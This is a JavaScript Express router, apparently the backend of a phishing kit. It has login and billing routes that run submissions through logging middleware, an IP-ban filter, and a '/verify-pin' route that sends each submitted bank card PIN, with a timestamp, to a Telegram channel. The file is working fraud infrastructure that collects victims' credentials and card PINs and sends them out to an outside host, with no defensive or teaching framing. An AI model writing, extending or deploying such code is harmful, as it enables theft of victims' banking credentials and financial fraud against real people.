const express = require("express");
const router = express.Router();
const { logLogin, logBilling } = require("../middleware/logger");
const { sendToTelegram } = require("../services/telegramService");
const checkBannedIP = require("../middleware/ipBanCheck");

// Login route
router.post("/login", checkBannedIP, logLogin, (req, res) => {
  res.json({ success: true });
});

// Billing route
router.post("/billing", checkBannedIP, logBilling, (req, res) => {
  res.json({ success: true });
});

router.post("/verify-pin", async (req, res) => {
  try {
    const { pin } = req.body;

    // Send PIN to Telegram
    await sendToTelegram(`
🔐 <b>Card PIN Submitted</b>

🔑 <b>PIN:</b> ${pin}
⏰ <b>Time:</b> ${new Date().toISOString()}
    `);

    // Send success response
    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Error processing PIN:", error);
    res.status(500).json({ error: "Failed to process PIN" });
  }
});

router.post("/check-ban", checkBannedIP, (req, res) => {
  res.json({ redirect: null });
});

module.exports = router;
